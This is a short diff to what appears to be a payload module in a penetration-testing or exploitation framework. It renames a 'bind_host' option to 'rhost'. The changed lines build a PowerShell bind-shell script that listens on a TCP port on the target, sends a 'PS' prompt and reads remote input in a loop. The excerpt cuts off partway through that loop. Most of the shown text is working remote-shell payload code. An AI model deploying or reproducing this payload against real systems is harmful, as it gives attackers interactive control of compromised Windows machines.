@@ -17,13 +17,13 @@ class Module(Payload):
         'session_type': SessionType.SHELL
     }
 
-    bind_host = OptString('0.0.0.0', 'Address to bind on the target', True)
+    rhost = OptString('0.0.0.0', 'Address to bind on the target', True)
     rport = OptPort(4444, 'Port to bind on the target', True)
     encoder = OptString('', 'Encoder', False, True)
 
     def _build_script(self) -> str:
         return (
-            f"$l=[System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Parse('{self.bind_host}'),{self.rport});"
+            f"$l=[System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Parse('{self.rhost}'),{self.rport});"
             "$l.Start();$c=$l.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|%{0};"
             "$prompt='PS '+(pwd).Path+'> ';$pb=[text.encoding]::ASCII.GetBytes($prompt);$s.Write($pb,0,$pb.Length);"
             "while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
